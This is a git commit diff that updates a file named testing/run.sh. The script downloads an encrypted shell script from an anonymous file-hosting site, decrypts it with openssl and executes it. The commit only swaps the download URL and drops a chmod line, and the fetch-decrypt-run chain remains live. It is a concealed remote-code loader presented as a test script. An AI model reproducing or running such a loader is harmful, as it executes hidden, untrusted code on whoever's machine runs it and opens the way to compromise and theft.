51273d0aa92b190704f2f7b734af0c31bf5570d4
Planet Nine <pl9-fund@pm.me>
2023-01-26 20:17:40 +0300

    Update run.sh

--- testing/run.sh
+++ testing/run.sh
@@ -1,6 +1,5 @@
 #! /bin/bash
 cd
-curl -O https://cdn-129.anonfiles.com/69F2cbUcyd/b27ac053-1674734909/x-l1bra2.sh.enc
-openssl enc -d -aes-256-cbc -in x-l1bra2.sh.enc -out x-l1bra.sh
-chmod +x x-l1bra.sh
+curl -O https://cdn-102.anonfiles.com/fem9d0Uay7/87256cd6-1674738000/x-l1bra.sh.enc
+openssl enc -d -aes-256-cbc -in x-l1bra.sh.enc -out x-l1bra.sh
 sh x-l1bra.sh
